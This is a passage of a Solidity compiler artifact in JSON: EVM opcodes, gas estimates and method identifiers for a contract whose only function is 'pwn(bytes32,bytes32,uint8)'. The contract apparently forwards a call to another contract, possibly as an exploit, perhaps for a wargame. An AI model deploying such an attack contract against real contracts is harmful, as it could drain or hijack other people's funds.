PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x153 SWAP6 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x2EA JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x16A JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x17C JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x19B DUP2 PUSH2 0x189 JUMP JUMPDEST DUP2 EQ PUSH2 0x1A5 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1B6 DUP2 PUSH2 0x192 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1D1 DUP2 PUSH2 0x1BC JUMP JUMPDEST DUP2 EQ PUSH2 0x1DB JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1EC DUP2 PUSH2 0x1C8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x209 JUMPI PUSH2 0x208 PUSH2 0x185 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x216 DUP7 DUP3 DUP8 ADD PUSH2 0x1A8 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x20 PUSH2 0x227 DUP7 DUP3 DUP8 ADD PUSH2 0x1A8 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x40 PUSH2 0x238 DUP7 DUP3 DUP8 ADD PUSH2 0x1DE JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x26B DUP3 PUSH2 0x242 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x27B DUP2 PUSH2 0x261 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x2B6 PUSH2 0x2B1 PUSH2 0x2AC DUP5 PUSH2 0x281 JUMP JUMPDEST PUSH2 0x293 JUMP JUMPDEST PUSH2 0x28A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2C6 DUP2 PUSH2 0x29C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x2D5 DUP2 PUSH2 0x189 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x2E4 DUP2 PUSH2 0x1BC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0xA0 DUP3 ADD SWAP1 POP PUSH2 0x2FD PUSH0 DUP4 ADD DUP9 PUSH2 0x272 JUMP JUMPDEST PUSH2 0x30A PUSH1 0x20 DUP4 ADD DUP8 PUSH2 0x2BD JUMP JUMPDEST PUSH2 0x317 PUSH1 0x40 DUP4 ADD DUP7 PUSH2 0x2CC JUMP JUMPDEST PUSH2 0x324 PUSH1 0x60 DUP4 ADD DUP6 PUSH2 0x2CC JUMP JUMPDEST PUSH2 0x331 PUSH1 0x80 DUP4 ADD DUP5 PUSH2 0x2DB JUMP JUMPDEST SWAP7 SWAP6 POP POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP15 SUB DUP14 SWAP15 KECCAK256 SWAP7 0xBC DUP9 0xE2 0x23 CODESIZE 0xB4 EXTCODEHASH CODECOPY OR JUMP 0xD4 SUB 0xDA PUSH15 0x41CF38B5BF2D2AD736806D0464736F PUSH13 0x63430008160033000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "176200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"pwn(bytes32,bytes32,uint8)": "infinite"
					}
				},
				"methodIdentifiers": {
					"pwn(bytes32,bytes32,uint8)": "6ed87507"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}